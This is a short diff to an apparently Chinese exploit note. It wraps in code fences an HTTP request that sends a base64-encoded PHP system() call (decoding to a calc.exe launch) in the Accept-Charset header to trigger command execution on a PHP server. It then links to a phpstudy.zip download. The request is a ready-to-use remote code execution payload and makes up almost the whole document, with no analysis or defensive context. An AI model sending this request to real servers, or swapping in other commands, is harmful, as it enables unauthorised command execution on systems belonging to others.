@@ -4,6 +4,7 @@
 
 版本一
 
+```
 GET /1.php HTTP/1.1
 Host: hedysx.com
 Cache-Control: max-age=0
@@ -15,6 +16,7 @@ Accept-Encoding:gzip,deflate
 Accept-Charset:这里就是要执行的命令 base64 加密 c3lzdGVtKCdjYWxjLmV4ZScpOw==
 Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
 Connection: close
+```
 
 版本二：  
 [phpstudy](https://www.hedysx.com/wp-content/uploads/2019/09/phpstudy.zip)
